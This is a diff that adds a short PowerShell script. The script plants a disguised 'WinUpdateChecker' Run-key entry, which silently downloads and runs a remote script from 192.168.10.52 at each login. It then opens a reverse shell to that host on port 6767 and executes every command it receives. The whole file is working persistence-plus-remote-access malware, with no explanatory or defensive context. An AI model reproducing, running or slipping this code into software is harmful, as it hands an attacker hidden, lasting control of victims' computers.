@@ -1,0 +1,26 @@
+$ip = '192.168.10.52'
+$port = 6767
+
+$regpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$payloadurl = "https://192.168.10.52/WinUpdateChecker.ps1"
+$command = "powershell -nop -w hidden -c iex ((New-Object Net.WebClient).DownloadString('$payloadurl'))"
+
+Set-ItemProperty -Path $regpath -Name "WinUpdateChecker" -Value $command
+
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$stream = $client.GetStream()
+$writer = New-Object IO.StreamWriter($stream)
+$buffer = New-Object Byte[] 1024
+while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
+    $data = ([text.encoding]::ASCII).GetString($buffer,0,$i)
+    try {
+        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
+    } catch {
+        $sendback = $_.Exception.Message
+    }
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $writer.Write($sendback2)
+    $writer.Flush()
+}
+$writer.Close()
+$client.Close()
